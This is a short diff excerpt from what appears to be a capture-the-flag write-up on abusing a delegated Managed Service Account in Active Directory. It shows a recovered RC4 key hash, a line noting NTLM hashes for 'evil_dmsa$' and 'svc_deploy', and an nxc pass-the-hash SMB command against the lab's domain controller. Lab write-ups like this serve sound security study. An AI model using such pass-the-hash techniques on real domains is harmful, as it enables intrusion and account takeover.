@@ -463,7 +463,7 @@ dMSA previous keys found in TGS (including keys of preceding managed accounts):
 RC4: e16081eb077aca74bdbf8af12af43ac9
 ```
 
-I now have a kirib and an NTLM 
+I now have a kirbi and an NTLM of the `evil_dmsa$` account but also the NTLM of `svc_deploy`
 
 ```python
 ❯❯❯ nxc smb dc01.checkpoint.htb -u 'evil_dmsa$' -H '7f669d33b962f788a753ee25142f7e67'
